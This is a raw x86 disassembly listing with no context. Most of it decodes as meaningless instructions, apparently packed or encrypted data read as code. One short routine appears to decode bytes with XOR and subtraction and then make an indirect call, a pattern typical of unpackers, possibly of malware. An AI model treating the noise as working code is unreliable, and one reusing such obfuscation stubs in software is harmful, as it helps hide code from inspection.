  4037ab:	lods   eax,DWORD PTR ds:[esi]
  4037ac:	push   edi
  4037ad:	aaa    
  4037ae:	mov    al,ds:0xcbe2572b
  4037b3:	lock lods eax,DWORD PTR ds:[esi]
  4037b5:	mov    edi,0xe35ac7f9
  4037ba:	(bad)  
  4037bb:	int3   
  4037bc:	mov    cl,0xad
  4037be:	stos   DWORD PTR es:[edi],eax
  4037bf:	mov    ebx,0xb957bc72
  4037c4:	add    al,0x90
  4037c6:	cli    
  4037c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037c8:	das    
  4037c9:	inc    ecx
  4037cb:	not    DWORD PTR [ebx]
  4037cd:	jp     0x4037e3
  4037cf:	and    BYTE PTR [edi+eiz*1-0x2d],bh
  4037d3:	in     al,0x6a
  4037d5:	cmp    BYTE PTR [edx],dh
  4037d7:	adc    dl,BYTE PTR [esi+0x60]
  4037da:	or     esp,ebp
  4037dc:	outs   dx,DWORD PTR ds:[esi]
  4037dd:	push   0x21
  4037df:	in     al,dx
  4037e0:	call   0x9f45746b
  4037e5:	cmc    
  4037e6:	imul   edi,DWORD PTR [edi+0x6f],0x79
  4037ea:	popa   
  4037eb:	in     eax,dx
  4037ec:	cli    
  4037ed:	add    eax,0x5ed414ba
  4037f2:	lds    cx,DWORD PTR [ecx+0x78]
  4037f6:	loopne 0x403868
  4037f8:	jle    0x403868
  4037fa:	and    DWORD PTR [ebp+edx*8-0x60a7b367],esp
  403801:	jge    0x403807
  403803:	xor    BYTE PTR [ebp+ebx*2+0x4f],ah
  403807:	lods   al,BYTE PTR ds:[esi]
  403808:	xchg   DWORD PTR [ebx-0x1ac815ed],ecx
  40380e:	scas   eax,DWORD PTR es:[edi]
  40380f:	mov    edi,0xca7480b
  403814:	mov    esp,0xedd333c0
  403819:	stc    
  40381a:	adc    DWORD PTR [eax+ebx*4-0x1b],0xffffff85
  40381f:	and    al,0xd9
  403821:	jbe    0x4037e8
  403823:	jmp    0x338b8780
  403828:	mov    esp,0x5af4381b
  40382d:	ins    DWORD PTR es:[edi],dx
  40382e:	shl    esi,cl
  403830:	sbb    esi,DWORD PTR [ebp+0x11]
  403833:	dec    ebx
  403834:	fbld   TBYTE PTR [edi+0x40477819]
  40383a:	int3   
  40383b:	mov    dl,0x59
  40383d:	bound  ebp,QWORD PTR [esi-0x36cccc30]
  403843:	inc    edx
  403844:	retf   0x72b
  403847:	mov    edi,DWORD PTR [eax-0x134b99fd]
  40384d:	popf   
  40384e:	pmaxsw mm5,QWORD PTR [eax+0x1330f47]
  403855:	inc    ebp
  403856:	hlt    
  403857:	mov    eax,DWORD PTR [ebp-0xc]
  40385a:	mov    ecx,DWORD PTR [ebp-0x8]
  40385d:	mov    ecx,DWORD PTR [ecx]
  40385f:	mov    ecx,DWORD PTR [ecx]
  403861:	mov    ecx,DWORD PTR [ecx]
  403863:	mov    DWORD PTR [ecx+0x1],eax
  403866:	mov    al,BYTE PTR [ebp-0x1]
  403869:	mov    ecx,DWORD PTR [ebp-0x8]
  40386c:	mov    ecx,DWORD PTR [ecx]
  40386e:	mov    ecx,DWORD PTR [ecx]
  403870:	mov    ecx,DWORD PTR [ecx]
  403872:	push   DWORD PTR [ebp-0x2c]
  403875:	xor    al,0x6f
  403877:	sub    al,0xd
  403879:	mov    BYTE PTR [ecx],al
  40387b:	mov    eax,ds:0x42178e
  403880:	push   DWORD PTR [eax]
  403882:	push   DWORD PTR ds:0x4219ea
  403888:	push   DWORD PTR ds:0x421796
  40388e:	push   DWORD PTR ds:0x4219ca
  403894:	push   DWORD PTR ds:0x421a5e
  40389a:	push   DWORD PTR [ebp-0x30]
  40389d:	push   DWORD PTR [ebp-0x20]
  4038a0:	mov    eax,DWORD PTR [ebp-0x8]
  4038a3:	mov    eax,DWORD PTR [eax]
  4038a5:	mov    eax,DWORD PTR [eax]
  4038a7:	mov    eax,DWORD PTR [eax]
  4038a9:	call   eax
  4038ab:	mov    eax,DWORD PTR [ebp-0x34]
  4038ae:	mov    ecx,DWORD PTR ds:0x42198e
  4038b4:	add    DWORD PTR [eax],ecx
  4038b6:	jmp    0x405c6b
  4038bb:	fnstenv [edx-0x73]
  4038be:	xchg   ebp,eax
  4038bf:	gs xchg ebp,eax
  4038c1:	test   eax,0x7c0e640e
  4038c6:	sbb    dl,BYTE PTR [ebp+0x76]
  4038c9:	push   ecx
  4038ca:	adc    ecx,edx
  4038cc:	pop    edi
  4038cd:	bound  esp,QWORD PTR [edx-0x36]
  4038d0:	pop    edi
  4038d1:	bound  esp,QWORD PTR [edx+0x52]
  4038d4:	retf   0x4dab
  4038d7:	ja     0x4038df
  4038d9:	dec    edx
  4038da:	pop    ds
  4038db:	mov    esi,0x61246103
  4038e0:	stos   DWORD PTR es:[edi],eax
  4038e1:	fs adc eax,0xc38e71e
  4038e7:	test   BYTE PTR [esi-0x78],dh
  4038ea:	daa    
  4038eb:	dec    esi
  4038ec:	cmp    al,0x2
  4038ee:	pop    ebp
  4038ef:	adc    eax,0x6fc8ce5e
  4038f4:	and    DWORD PTR fs:[esi-0x56],0x55
  4038f9:	fdiv   QWORD PTR [esi-0x4]
  4038fc:	fnstcw WORD PTR [edx-0x66d9f73c]
  403902:	and    al,0xe
  403904:	in     al,dx
  403905:	pushw  0x69
  403908:	retf   
  403909:	jge    0x4038d0
  40390b:	ss xchg esp,eax
  40390d:	fcmovnb st,st(6)
  40390f:	xchg   ebx,eax
  403910:	repz sub DWORD PTR [edx-0x38],ebp
  403914:	ret    0x602c
  403917:	pop    esi
  403918:	adc    al,0x7f
  40391a:	mov    eax,ds:0xbde4025f
  40391f:	daa    
  403920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403921:	sahf   
  403922:	das    
  403923:	inc    ebx
  403924:	loop   0x4038b9
  403926:	sub    esp,DWORD PTR [edi+0x71e2de]
  40392c:	mov    dh,0x13
  40392e:	push   edx
  40392f:	pop    edi
  403930:	shr    BYTE PTR [eax+0x64],0xf9
  403934:	jo     0x4038d5
  403936:	push   es
  403937:	pop    es
  403938:	xchg   ebx,eax
  403939:	cmc    
  40393a:	sbb    BYTE PTR [ecx+0x3fad1050],dh
  403940:	(bad)  
  403941:	call   0x10a995a
  403946:	cs jns 0x40394c
  403949:	push   ss
  40394a:	popa   
  40394b:	paddq  mm7,QWORD PTR [ebp-0x4b0b03ca]
  403952:	cs dec ebp
  403954:	cwde   
  403955:	out    dx,eax
  403956:	pop    ecx
  403957:	stos   DWORD PTR es:[edi],eax
  403958:	int3   
  403959:	adc    eax,0xb98d6324
  40395e:	dec    esp
  40395f:	out    0x4d,eax
  403961:	and    BYTE PTR [ecx-0x3],ch
  403964:	xor    ebx,DWORD PTR [edx+0x16346dd3]
  40396a:	dec    ebp
  40396b:	nop
  40396c:	xlat   BYTE PTR ds:[bx]
  40396e:	stc    
  40396f:	or     esi,DWORD PTR ds:0x13ebc180
  403975:	inc    ecx
  403976:	shl    BYTE PTR [edx+edx*4+0x742de336],1
  40397d:	xor    eax,0x1d30db07
  403982:	out    dx,al
  403983:	ret    0xd03
  403986:	mov    ecx,0x311504ca
  40398b:	div    edx
  40398d:	and    al,0x3f
  40398f:	out    0xf8,eax
  403991:	aaa    
  403992:	pop    ss
  403993:	xor    BYTE PTR [edx+0x9],al
  403996:	xor    ecx,DWORD PTR [esi-0x40d811e4]
  40399c:	shr    DWORD PTR [ebx+eax*2],cl
  40399f:	lods   al,BYTE PTR ds:[esi]
  4039a0:	or     al,0xc7
  4039a2:	sbb    BYTE PTR [edi-0x4cbc5964],dl
  4039a8:	icebp  
  4039a9:	imul   esi,DWORD PTR [ecx+0x3],0xffffffac
  4039ad:	lods   al,BYTE PTR ds:[esi]
  4039ae:	jns    0x4039d4
  4039b0:	inc    edi
  4039b1:	ret    0xc396
  4039b4:	pop    ebx
  4039b5:	fistp  QWORD PTR [edx+0x7]
  4039b8:	das    
  4039b9:	retf   
  4039ba:	gs rcr ebx,0x22
  4039be:	aas    
  4039bf:	fs cmc 
  4039c1:	add    eax,0xb2e80272
  4039c6:	or     eax,0x53e9b780
  4039cb:	pop    ebx
  4039cc:	test   DWORD PTR [edi-0x3a],edx
  4039cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039d0:	stos   BYTE PTR es:[edi],al
  4039d1:	pop    ebp
  4039d2:	adc    DWORD PTR [ebx-0x5e66439c],ebx
  4039d8:	inc    edi
  4039d9:	ret    
  4039da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039db:	imul   esp,DWORD PTR [eax+edx*8],0x4a3d9f46
  4039e2:	jmp    0x40399e
  4039e4:	fidivr WORD PTR [edi+0x4c]
  4039e7:	xchg   BYTE PTR [edi+0x4d],cl
  4039ea:	xchg   edi,eax
  4039eb:	mov    al,ds:0x74d17189
  4039f0:	aad    0x20
  4039f2:	push   ecx
  4039f3:	sub    edi,DWORD PTR [eax]
  4039f5:	rol    BYTE PTR [eax],1
  4039f7:	mov    BYTE PTR [ebx+0x2de6e45e],cl
  4039fd:	bound  ecx,QWORD PTR [ecx]
  4039ff:	or     edi,DWORD PTR [esp+ebx*8-0xb]
  403a03:	fbld   TBYTE PTR [ebx+0x29]
  403a06:	add    al,0x95
  403a08:	jle    0x403a07
  403a0a:	xchg   esi,eax
  403a0b:	mov    bl,0xd
  403a0d:	(bad)  
  403a0e:	lods   al,BYTE PTR ds:[esi]
  403a0f:	jbe    0x403a77
  403a11:	jae    0x4039cf
  403a13:	mul    BYTE PTR [eax-0x931a6f1]
  403a19:	icebp  
  403a1a:	mov    DWORD PTR [edx-0x7785ab7b],0xbbabff0f
  403a24:	add    ah,BYTE PTR [ebx]
  403a26:	stos   DWORD PTR es:[edi],eax
  403a27:	sbb    esi,DWORD PTR [eax+0x18]
  403a2a:	or     cl,ch
  403a2c:	push   edx
  403a2d:	fabs   
  403a2f:	cmp    DWORD PTR [ebp+edi*8-0x303d2029],ebp
  403a36:	out    dx,eax
  403a37:	test   al,0xcb
  403a39:	pusha  
  403a3a:	(bad)  
  403a3b:	arpl   WORD PTR [edi+0x6922362f],ax
  403a41:	xor    ch,ah
  403a43:	inc    ebp
  403a44:	cmp    al,0xe2
  403a46:	cmp    al,0xef
  403a48:	std    
  403a49:	arpl   bp,cx
  403a4b:	inc    ebx
  403a4c:	pop    ss
  403a4d:	jo     0x403a58
  403a4f:	push   esi
  403a50:	dec    edx
  403a51:	mov    WORD PTR [edx],gs
  403a53:	mov    ds,WORD PTR [ecx+0x5f9717fa]
  403a59:	push   ds
  403a5a:	sbb    BYTE PTR [ebp+0x58],ah
  403a5d:	push   ebp
  403a5e:	ret    
  403a5f:	sar    DWORD PTR [ebx-0x5c03c34],cl
  403a65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a66:	push   esi
  403a67:	hlt    
  403a68:	scas   eax,DWORD PTR es:[edi]
  403a69:	mov    ch,0xf9
  403a6b:	outs   dx,DWORD PTR ds:[esi]
  403a6c:	jb     0x403a3f
  403a6e:	push   edi
  403a6f:	push   edx
  403a70:	ins    BYTE PTR es:[edi],dx
  403a71:	add    al,0x51
  403a73:	cmp    eax,DWORD PTR [ebp+0x5a67e736]
  403a79:	xchg   edx,eax
  403a7a:	jmp    0x4039fc
  403a7c:	jb     0x403aec
  403a7e:	mov    dl,0xef
  403a80:	sub    al,0xa1
  403a82:	(bad)
  403a85:	scas   eax,DWORD PTR es:[edi]
  403a86:	or     bl,cl
  403a88:	pushf  
  403a89:	fistp  QWORD PTR [edx+edi*1-0x28]
  403a8d:	cmp    eax,0x7fd092ae
  403a92:	add    al,0x45
  403a94:	jno    0x403ae4
  403a96:	popf   
  403a97:	push   ebp
  403a98:	(bad)  
  403a99:	and    edi,edx
  403a9b:	lea    edi,[eax+0x3a]
  403a9e:	cmp    al,BYTE PTR [ecx-0x488eac41]
  403aa4:	fldenv [esi-0x5ca042f0]
  403aaa:	jb     0x403b1c
  403aac:	repnz test eax,0x62fd4882
  403ab2:	mov    ds:0xb65fcc6a,al
  403ab7:	test   al,0x79
  403ab9:	lods   eax,DWORD PTR ds:[esi]
  403aba:	sti    
  403abb:	aam    0x9a
  403abd:	das    
  403abe:	in     al,0x62
  403ac0:	fwait
  403ac1:	mov    ch,0xed
  403ac3:	xchg   edx,eax
  403ac4:	enter  0xbf71,0x9
  403ac8:	xchg   edx,eax
  403ac9:	mov    cl,0x6a
  403acb:	in     eax,dx
  403acc:	sub    DWORD PTR [esi-0x7b2b638c],0x3f
  403ad3:	dec    edi
  403ad4:	xor    esp,DWORD PTR [ecx+ebp*1+0x43]
  403ad8:	cld    
  403ad9:	dec    ebp
  403ada:	fcmovne st,st(0)
  403adc:	leave  
  403add:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ade:	mov    bh,BYTE PTR [ebp-0xb65d5b3]
  403ae4:	jp     0x403ad0
  403ae6:	jo     0x403a96
  403ae8:	fcomip st,st(2)
  403aea:	adc    al,0x71
  403aec:	es inc esi
  403aee:	ds xchg ecx,eax
  403af0:	jb     0x403afa
  403af2:	pop    esp
  403af3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403af4:	fld    TBYTE PTR [ebp+ebp*4-0x2f]
  403af8:	push   edi
  403af9:	pop    ecx
  403afa:	in     eax,dx
  403afb:	sbb    ebx,ebx
  403afd:	stos   DWORD PTR es:[edi],eax
  403afe:	dec    edx
  403aff:	and    DWORD PTR [edx+ebp*8],edx
  403b02:	inc    ebp
  403b03:	lods   al,BYTE PTR ds:[esi]
  403b04:	jo     0x403aee
  403b06:	sub    eax,0xe26b1beb
  403b0b:	stos   BYTE PTR es:[edi],al
  403b0c:	inc    ebp
  403b0d:	sub    al,0x31
  403b0f:	call   0xe1dc:0x8c8bf803
  403b16:	(bad)  
  403b17:	xchg   ebx,eax
  403b18:	and    BYTE PTR [ebx],bh
  403b1a:	push   0x80a135f5
  403b1f:	jmp    FWORD PTR [ebx]
  403b21:	or     BYTE PTR [edi-0x32],0x66
  403b25:	sub    BYTE PTR [edi-0x287dbcbd],bl
  403b2b:	sbb    dl,bh
  403b2d:	mov    edi,0xfeb6635b
  403b32:	xchg   BYTE PTR [bp+si-0x44a9],bh
  403b37:	(bad)  
  403b38:	jbe    0x403abf
  403b3a:	int    0xc
  403b3c:	cdq    
  403b3d:	mov    dh,bl
  403b3f:	cmp    eax,0x4145c4a8
  403b44:	les    edx,FWORD PTR [edx]
  403b46:	fild   DWORD PTR [ebp-0x11]
  403b49:	mov    ebx,0xf431b665
  403b4e:	ds push edx
  403b50:	push   ebp
  403b51:	dec    ebx
  403b52:	das    
  403b53:	add    BYTE PTR [eax],al
  403b55:	add    DWORD PTR [ebx+0x79],ebx
  403b58:	out    0xa5,al
  403b5a:	clc    
  403b5b:	es mov edx,0x4de72963
  403b61:	dec    ecx
  403b62:	mov    bl,0xd2
  403b64:	imul   esi,DWORD PTR [edi],0xc991c2b5
  403b6a:	jge    0x403b8e
  403b6c:	dec    esi
  403b6d:	mov    al,ds:0xdb7062be
  403b72:	dec    ebp
  403b73:	jp     0x403bc1
  403b75:	fimul  WORD PTR [eax-0x1290d496]
  403b7b:	mov    dh,0xd5
  403b7d:	dec    eax
  403b7e:	pop    ebp
  403b7f:	(bad)  
  403b80:	mov    DWORD PTR [ecx+eiz*4+0x6806e0a],edi
  403b87:	sbb    DWORD PTR [edx+0x37],edi
  403b8a:	mov    esi,0xa5021973
  403b8f:	inc    ebx
  403b90:	popf   
  403b91:	xor    DWORD PTR [edx+ebp*8+0x33],edx
  403b95:	adc    esp,edx
  403b97:	mov    ecx,0xf9700b1b
  403b9c:	sbb    DWORD PTR [eax],ecx
  403b9e:	xchg   esi,eax
  403b9f:	ds or  eax,0x6c8ad2cc
  403ba5:	pop    edx
  403ba6:	adc    ecx,esp
  403ba8:	stos   DWORD PTR es:[edi],eax
  403ba9:	outs   dx,DWORD PTR ds:[esi]
  403baa:	push   ebp
  403bab:	(bad)  
  403bac:	adc    al,0x2d
  403bae:	mov    eax,DWORD PTR [eax+0x2b]
  403bb1:	mov    eax,ds:0xa7a59d60
  403bb6:	stos   BYTE PTR es:[edi],al
  403bb7:	xor    ah,BYTE PTR [esi-0x11]
  403bba:	inc    eax
  403bbb:	sbb    eax,0xeb46c4c3
  403bc0:	and    BYTE PTR [ecx],bl
  403bc2:	inc    ecx
  403bc3:	and    al,0xc6
  403bc5:	mov    esp,0x27456ee7
  403bca:	scas   al,BYTE PTR es:[edi]
  403bcb:	ficom  WORD PTR [eax-0x6fa4e83f]
  403bd1:	mov    cl,0x7a
  403bd3:	loope  0x403b92
  403bd5:	aam    0xd5
  403bd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bd8:	popf   
  403bd9:	and    bl,cl
  403bdb:	pusha  
  403bdc:	pop    eax
  403bdd:	int3   
  403bde:	dec    ebp
  403bdf:	loop   0x403b9a
  403be1:	stos   DWORD PTR es:[edi],eax
  403be2:	xlat   BYTE PTR ds:[ebx]
  403be3:	mov    DWORD PTR [ecx],ecx
  403be5:	test   eax,0x57ba1018
  403bea:	or     DWORD PTR [esi],0x442a31b4
  403bf0:	dec    esp
  403bf2:	inc    edx
  403bf3:	cld    
  403bf4:	mov    ch,0xea
  403bf6:	jo     0x403c2e
  403bf8:	neg    BYTE PTR [eax+ebx*8]
  403bfb:	sbb    bh,0x9b
  403bfe:	(bad)  
  403bff:	push   ebp
  403c00:	inc    edx
  403c01:	mov    al,ds:0xe053db6e
  403c06:	add    al,0x74
  403c08:	xchg   ebx,eax
  403c09:	aad    0xd
  403c0b:	ret    0xb334
  403c0e:	fs dec ebx
  403c10:	xor    BYTE PTR [eax-0x27],ah
  403c13:	stos   BYTE PTR es:[edi],al
  403c14:	fwait
  403c15:	jb     0x403c80
  403c17:	push   es
  403c18:	ret    
  403c19:	adc    al,0xd1
  403c1b:	iret   
  403c1c:	fistp  DWORD PTR [esi+0x74]
  403c1f:	fwait
  403c20:	jmp    0xa9b0:0xf1bdd4a5
  403c27:	sahf   
  403c28:	pusha  
  403c29:	loopne 0x403c39
  403c2b:	jne    0x403c9c
  403c2d:	xor    dh,bl
  403c2f:	and    eax,0xa841b40
  403c34:	jg     0x403ca9
  403c36:	inc    ebx
  403c37:	xor    esp,DWORD PTR [edx-0x3]
  403c3a:	or     eax,eax
  403c3c:	bound  edi,QWORD PTR [eax+ebp*1+0x7b]
  403c40:	pop    esi
  403c41:	cmp    DWORD PTR ds:0xd65f9a2d,0x141d1a96
  403c4b:	xlat   BYTE PTR ds:[ebx]
  403c4c:	and    BYTE PTR ds:0xcbebf7db,cl
  403c52:	sar    DWORD PTR [ecx],cl
  403c54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c55:	xor    dh,cl
  403c57:	out    dx,eax
  403c58:	jle    0x403c02
  403c5a:	xchg   BYTE PTR [esp+esi*1+0x6cb66e27],cl
  403c61:	sub    BYTE PTR [ebx-0x11],dl
  403c64:	add    eax,ebp
  403c66:	std    
  403c67:	iret   
  403c68:	popa   
  403c69:	addr16 fcomp st(6)
  403c6c:	fld    DWORD PTR [edx-0x22]
  403c6f:	scas   al,BYTE PTR es:[edi]
  403c70:	sbb    BYTE PTR [esi*8-0x3edcfd4a],ah
  403c77:	lahf   
  403c78:	imul   esp,edx,0x8c928296
  403c7e:	jb     0x403cf0
  403c80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c81:	sbb    DWORD PTR [edi+edi*2],esi
  403c84:	cmp    BYTE PTR [edi],cl
  403c86:	or     dl,BYTE PTR [eax+0x34]
  403c89:	nop
  403c8a:	inc    esi
  403c8b:	mov    edx,0xf6f6e023
  403c90:	or     bl,BYTE PTR ds:0xcd7464a5
  403c96:	sub    dh,dh
  403c98:	xor    esi,DWORD PTR [edi-0x6843b7ee]
  403c9e:	push   esi
  403c9f:	in     eax,0x88
  403ca1:	int3   
  403ca2:	push   esi
  403ca3:	jbe    0x403cba
  403ca5:	lock push edi
  403ca7:	ja     0x403c94
  403ca9:	mov    bl,0x5a
  403cab:	or     edx,esp
  403cad:	stos   BYTE PTR es:[edi],al
  403cae:	adc    eax,DWORD PTR [edi+0xca5d621]
  403cb4:	mov    al,ds:0x38e2fff
  403cb9:	js     0x403cf4
  403cbb:	dec    esp
  403cbc:	fs mov ebp,0xda521e9a
  403cc2:	push   eax
  403cc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cc4:	jge    0x403c83
  403cc6:	sahf   
  403cc7:	adc    al,0xdf
  403cc9:	add    cl,BYTE PTR [esi+0x7d]
  403ccc:	out    0xf4,al
  403cce:	jmp    0x403ce9
  403cd0:	dec    edi
  403cd1:	and    al,0x8d
  403cd3:	je     0x403c60
  403cd5:	mov    bl,0xe6
  403cd7:	mov    es,WORD PTR [edx+0x1c1574db]
  403cdd:	dec    edi
  403cde:	cs inc eax
  403ce0:	cmp    al,0xb1
  403ce2:	sub    DWORD PTR [edx+0x9bb846c],esi
  403ce8:	push   es
  403ce9:	or     DWORD PTR [edx-0x730eb20c],ebp
  403cef:	mov    al,0x99
  403cf1:	cld    
  403cf2:	dec    esi
  403cf3:	pop    edx
  403cf4:	or     ebx,esp
  403cf6:	js     0x403d59
  403cf8:	inc    ecx
  403cf9:	stos   DWORD PTR es:[edi],eax
  403cfa:	dec    edx
  403cfb:	lds    ecx,FWORD PTR [eax]
  403cfd:	mov    dh,0x6e
  403cff:	jae    0x403cdd
  403d01:	jnp    0x403d4b
  403d03:	push   edi
  403d04:	sahf   
  403d05:	fwait
  403d06:	call   0xfeeb271e
  403d0b:	stos   BYTE PTR es:[edi],al
  403d0c:	aaa    
  403d0d:	fcomp  DWORD PTR [ebx-0x542abe43]
  403d13:	inc    eax
  403d14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d15:	(bad)  
  403d16:	fld    DWORD PTR [esi]
  403d18:	mov    ebp,0x61cfa27d
  403d1d:	shl    DWORD PTR [ebp+0x25],1
  403d20:	inc    esp
  403d21:	cmp    BYTE PTR [ebp-0x61],dh
  403d24:	push   DWORD PTR [edx+eax*2-0x6921f74a]
  403d2b:	add    bh,BYTE PTR [esi+eiz*1-0x58e94433]
  403d32:	popa   
  403d33:	idiv   BYTE PTR [edi]
  403d35:	icebp  
  403d36:	sahf   
  403d37:	repnz push ebp
  403d39:	repnz ins BYTE PTR es:[edi],dx
  403d3b:	mov    edx,0x9cc0bf66
  403d40:	and    BYTE PTR [ebp-0x66],0x88
  403d44:	call   0x1d6d:0xef5842f8
  403d4b:	and    al,0x29
  403d4d:	pop    ebx
  403d4e:	cmp    eax,0xc7cbfd8e
  403d53:	ret    0x4ddb
  403d56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d57:	sub    DWORD PTR [edx],0x2d93fc42
  403d5d:	fldenv [eax+0x46]
  403d60:	stos   BYTE PTR es:[edi],al
  403d61:	jg     0x403d94
  403d63:	not    DWORD PTR [ebx-0x20]
  403d66:	mov    ss,WORD PTR [ebx+0x5f]
  403d69:	cmp    bh,ah
  403d6b:	(bad)
  403d6e:	(bad)  
  403d6f:	and    al,0x94
  403d71:	cmc    
  403d72:	neg    DWORD PTR [ebx]
  403d74:	enter  0xad5d,0x67
  403d78:	aaa    
  403d79:	jl     0x403d0d
  403d7b:	mov    al,BYTE PTR ds:0xac6d7ec0
  403d81:	xchg   esp,eax
  403d82:	das    
  403d83:	pop    eax
  403d84:	hlt    
  403d85:	call   0x311b:0x2e4a5aaa
  403d8c:	outs   dx,BYTE PTR ds:[esi]
  403d8d:	(bad)  
  403d8e:	sahf   
  403d8f:	jne    0x403d91
  403d91:	pusha  
  403d92:	add    cl,ch
  403d94:	xchg   edx,eax
  403d95:	inc    ebx
  403d96:	dec    edx
  403d97:	push   ds
  403d98:	xor    BYTE PTR [edx-0x54],0x56
  403d9c:	and    eax,0x2fb14855
  403da1:	fcom   QWORD PTR [ecx+edx*1-0x3]
  403da5:	es ins DWORD PTR es:[edi],dx
  403da7:	lds    esp,FWORD PTR [ebp+0x122fa1e3]
  403dad:	pusha  
  403dae:	add    esp,DWORD PTR [ecx+0x3f]
  403db1:	xor    dl,BYTE PTR [edi]
  403db3:	sub    bl,ch
  403db5:	pop    esi
  403db6:	mov    al,ds:0xd227fd64
  403dbb:	aad    0x4c
  403dbd:	and    eax,0x84da0fda
  403dc2:	and    eax,0x247fc855
  403dc7:	mov    bl,0x5b
  403dc9:	pop    esi
  403dca:	fnsave [edx+0x6]
  403dcd:	fdiv   QWORD PTR [edi-0x7a9e9e5f]
  403dd3:	sahf   
  403dd4:	stos   BYTE PTR es:[edi],al
  403dd5:	xor    edi,DWORD PTR [edi-0x44d5d43]
  403ddb:	xchg   edx,eax
  403ddc:	std    
  403ddd:	pop    ebp
  403dde:	test   al,0xe3
  403de0:	lea    ecx,[ebx+0x46]
  403de3:	fincstp 
  403de5:	enter  0x6c71,0xe2
  403de9:	ret    0xf84c
  403dec:	lock xchg ecx,eax
  403dee:	cmp    BYTE PTR [edx+0x19be6ee3],al
  403df4:	test   DWORD PTR [ebp+0x76933a66],ecx
  403dfa:	pop    ebp
  403dfb:	loop   0x403e03
  403dfd:	jg     0x403e3e
  403dff:	push   eax
  403e00:	mov    al,0x59
  403e02:	imul   ebp,DWORD PTR [edi-0x4f],0x35c91506
  403e09:	xchg   esi,esi
  403e0b:	sub    DWORD PTR [si-0x56],esp
  403e0f:	push   ds
  403e10:	sar    DWORD PTR [edx-0x4a],0x3
  403e14:	lods   al,BYTE PTR ds:[esi]
  403e15:	add    al,0x47
  403e17:	das    
  403e18:	and    BYTE PTR [ecx+0x3d1a456e],0x70
  403e1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e20:	ret    
  403e21:	add    ch,bl
  403e23:	mov    edi,0x3c1b3e91
  403e28:	into   
  403e29:	dec    esi
  403e2a:	pop    ecx
  403e2b:	pop    ebp
  403e2c:	push   ebx
  403e2d:	sub    BYTE PTR [ebx-0x1cb0e0f5],0x75
  403e34:	test   eax,0x7dbb9d5c
  403e39:	leave  
  403e3a:	in     al,dx
  403e3b:	les    ebx,FWORD PTR [edi]
  403e3d:	xchg   esi,eax
  403e3e:	lock addr16 dec ebp
  403e41:	push   edx
  403e42:	xor    DWORD PTR [ecx+0x73dcaa57],ebp
  403e48:	push   ebx
  403e49:	sub    eax,DWORD PTR [edx+0x85de96]
  403e4f:	std    
  403e50:	push   eax
  403e51:	xchg   DWORD PTR fs:[ecx-0x57b24587],edi
  403e58:	mov    BYTE PTR [ebp+0x7],ah
  403e5b:	fwait
  403e5c:	push   ds
  403e5d:	out    dx,eax
  403e5e:	mov    al,ds:0xffd876b5
  403e63:	iret   
  403e64:	cmp    al,0x6e
  403e66:	les    ecx,FWORD PTR [edx-0x1a4dd147]
  403e6c:	mov    esi,0x50498008
  403e71:	or     eax,0x86679da
  403e76:	and    eax,0x8c5ffcbd
  403e7b:	mov    dl,0x15
  403e7d:	sbb    BYTE PTR [ecx-0x56],0xbd
  403e81:	das    
  403e82:	scas   al,BYTE PTR es:[edi]
  403e83:	or     al,0x8
  403e85:	sbb    ch,BYTE PTR [ebx+eiz*4+0x11]
  403e89:	and    DWORD PTR [ecx+0x5e510424],0x6f
  403e90:	in     al,0x4d
  403e92:	ret    0x2b70
  403e95:	cmp    DWORD PTR [esi+eiz*4],edx
  403e98:	test   BYTE PTR [esi-0x109ce070],dl
  403e9e:	jg     0x403e3e
  403ea0:	shl    BYTE PTR ds:0xf00470aa,1
  403ea6:	out    0x1e,al
  403ea8:	sbb    edx,eax
  403eaa:	mov    al,ds:0x6e006efa
  403eaf:	dec    esi
  403eb0:	in     eax,dx
  403eb1:	(bad)  
  403eb2:	in     eax,dx
  403eb3:	aam    0xd3
  403eb5:	js     0x403e55
  403eb7:	mov    dh,0x49
  403eb9:	inc    ebp
  403eba:	mov    al,0xd3
  403ebc:	xchg   edi,ebp
  403ebe:	sbb    BYTE PTR [ebx],ch
  403ec0:	dec    esp
  403ec1:	pop    esp
  403ec2:	push   0x29d498ed
  403ec7:	std    
  403ec8:	pop    edx
  403ec9:	adc    DWORD PTR [ebp-0x57],ecx
  403ecc:	xchg   ecx,eax
  403ecd:	jbe    0x403e81
  403ecf:	popa   
  403ed0:	mov    fs,WORD PTR [esi]
  403ed2:	es ja  0x403ef8
  403ed5:	gs aad 0x14
  403ed8:	mov    edx,DWORD PTR [esi-0x1a]
  403edb:	stos   DWORD PTR es:[edi],eax
  403edc:	inc    ebx
  403edd:	scas   eax,DWORD PTR es:[edi]
  403ede:	repz cmp esp,ebp
  403ee1:	adc    al,0xa0
  403ee3:	xchg   edx,eax
  403ee4:	pop    edi
  403ee5:	add    al,0xc8
  403ee7:	nop
  403ee8:	xchg   esi,eax
  403ee9:	inc    edx
  403eea:	add    eax,0xcf2d25b1
  403eef:	mov    ?,WORD PTR [eax-0xc97e0dd]
  403ef5:	or     al,0xec
  403ef7:	mov    edx,DWORD PTR [esi]
  403ef9:	(bad)  
  403efa:	mov    dl,0xfc
  403efc:	cmc    
  403efd:	inc    edx
  403efe:	leave  
  403eff:	push   ds
  403f00:	fsubr  QWORD PTR [esi-0x23dc57f5]
  403f06:	test   al,al
  403f08:	stc    
  403f09:	mov    ds:0xb1f646ad,eax
  403f0e:	sar    BYTE PTR [edx],cl
  403f10:	in     eax,0x5e
  403f12:	mov    bh,0x97
  403f14:	sub    edx,DWORD PTR [ebp-0xe]
  403f17:	lods   al,BYTE PTR ds:[esi]
  403f18:	push   edi
  403f19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f1a:	mov    cl,0x49
  403f1c:	in     eax,0xe1
